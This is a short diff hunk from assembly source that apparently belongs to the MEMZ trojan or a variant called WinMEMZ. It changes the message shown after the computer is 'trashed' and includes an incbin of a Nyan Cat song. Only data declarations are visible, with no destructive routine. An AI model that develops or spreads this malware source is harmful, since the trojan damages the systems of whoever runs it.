@@ -41,5 +41,5 @@ specialLength: equ $-special
 song:        incbin "../../Build/song.bin"
 songLength:  equ $-song
 
-message:       db "Your computer has been trashed by the MEMZ trojan. Now enjoy the Nyan Cat..."
+message:       db "You've got trashed by WinMEMZ XD. Now enjoy the Nyan Cat..."
 messageLength: equ $-message
